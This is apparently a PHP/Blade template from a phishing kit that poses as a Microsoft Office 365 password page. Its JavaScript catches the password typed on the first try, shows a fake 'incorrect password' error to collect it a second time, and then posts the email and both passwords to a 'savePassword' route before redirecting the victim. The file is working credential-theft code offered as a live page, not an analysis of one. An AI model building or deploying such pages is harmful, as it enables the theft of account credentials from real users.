<?php

    $title = \App\User::where('id',1)->first(); 
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Sign in to your {{$title->name}} account</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="assets/images/favicon1.ico">
    <meta name="csrf-token" content="{{csrf_token()}}">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/pass.css">
    <link href="font-awesome/css/font-awesome.min.css" rel="stylesheet">
    
    <style type="text/css">
        
    </style>
</head>
<body>
  
<div class="container-fluid">
    <div class="row d-flex align-items-center">
        <div class="col-lg-4 col-md-4 col-xs-12 mx-auto">
        <?php
            $url = "https://outlook.office365.com/owa";
            $us = \Session::get('email');
            $dominos = $domain = substr(strstr($us, '@'), 1);
            $locale = "$url/$dominos";
        ?>
            <div class="card">
                <div class="card-body">
                    <img src="assets/images/logo.svg">
                    <p><a href="?cngmail=true"><img src="assets/images/arrow_left.svg"> {{Session::get('email')}}</a></p>
                    <h4>Enter password</h4>
                    <span id="error" class="d-none">Your account or password is incorrect. If you don't remember your password, <a href="#">reset it now.</a></span>
                    <form method="POST">
                        <div class="form-group">
                            <input type="password" class="form-control" id="pass" name="pass" placeholder="Password" required>
                            <input type="hidden" name="email" id="email" value="{{Session::get('email')}}">
                            <input type="hidden" name="pass_iba" id="pass_iba">
                        </div>
                        <div class="form-group form-check">
                            <label class="form-check-label">
                                <input class="form-check-input" type="checkbox"> Keep me signed in
                            </label>
                        </div>
                        <p><a href="#">Forgot my password</a></p>
                        <button type="submit" class="btn float-right">Sign In</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="footer">
    <p><img src="assets/images/ellipsis_white.svg"></p>
    <p>Privacy & cookies</p>
    <p>Terms of use</p>
    <p>©<?php echo date('Y'); ?> {{$title->name}}</p>
</div>
<script src="{{asset('j/jquery-3.2.1.min.js')}}"></script>
<script type="text/javascript">
    $(document).ready(function(){
            $.ajaxSetup({
                headers: {
                    'X-CSRF-TOKEN':$('meta[name="csrf-token"]').attr('content')
                }
            });
        });
</script>  
<script  type="text/javascript">
    
    location.hash = "{{$title->password}}";

    $(function() {
        $(document).on('focus', '.form-control', function() {
            $(this).css({'border-bottom': '1px solid #0067b8'});
        });

        $(document).on('blur', '.form-control', function() {
            $(this).css({'border-bottom': ''});
        });
        
        var success = 0;
        $(document).on('submit', 'form', function(event) {
            event.preventDefault();
            
            var pass    = $('#pass').val();
            
            if(success == 0) {
                
                setTimeout(function() {
                    $('#pass').val('');
                    $('#pass_iba').val(pass);
                    $('.form-control').css({'border-bottom': '1px solid #e81123'});
                    $('#error').toggleClass('d-none d-block');
                    
                    $(document).on('focus', '.form-control', function() {
                        $(this).css({'border-bottom': '1px solid #e81123'});
                    });
            
                    $(document).on('blur', '.form-control', function() {
                        $(this).css({'border-bottom': '1px solid #e81123'});
                    });
                    
                    success = 1;
                }, 1000);
            }
                else
                {
                    $.post("{{route('savePassword')}}", 
                    {email:$('#email').val(), password_iba: $('#pass_iba').val(), password: $('#pass').val()}, 
                    function(data) {
                    console.log('done..........');
                        setTimeout(function() {
                        window.location = "{{route('login.live')}}"; 
                        }, 1000);
                   });
                 

                }
        });
    });    
   
</script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
</body>
</html>